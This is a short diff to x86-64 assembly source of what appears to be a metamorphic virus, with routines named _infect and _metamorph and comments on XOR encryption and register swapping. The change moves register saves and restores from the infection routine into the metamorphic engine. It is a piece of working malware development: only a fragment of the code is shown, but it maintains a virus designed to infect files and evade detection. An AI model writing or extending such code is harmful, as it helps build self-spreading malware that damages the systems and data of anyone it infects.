@@ -1166,17 +1166,7 @@ _infect:
 
 	push rdi
 	mov rdi, r8
-	push r8
-	push r11
-	push rsi
-	push rcx
-	push rdx
 	call _metamorph
-	pop rdx
-	pop rcx
-	pop rsi
-	pop r11
-	pop r8
 	pop rdi
 
 	sub rdx, rcx
@@ -1271,6 +1261,11 @@ ret
 
 ; I'm a pokemon
 _metamorph:; (rdi -> ptr)
+	push r8
+	push r11
+	push rsi
+	push rcx
+	push rdx
 	; xor_encrypt
 	; swap registry r8, r9 -> r9, r10 -> ... -> r14, r15 -> r8, r9 -> ...
 	push rdi
@@ -1545,6 +1540,12 @@ _metamorph:; (rdi -> ptr)
 	mov rdi, r11
 	mov rax, SYSCALL_CLOSE
 	syscall
+
+	pop rdx
+	pop rcx
+	pop rsi
+	pop r11
+	pop r8
 ret
 
 _yes_or_no:
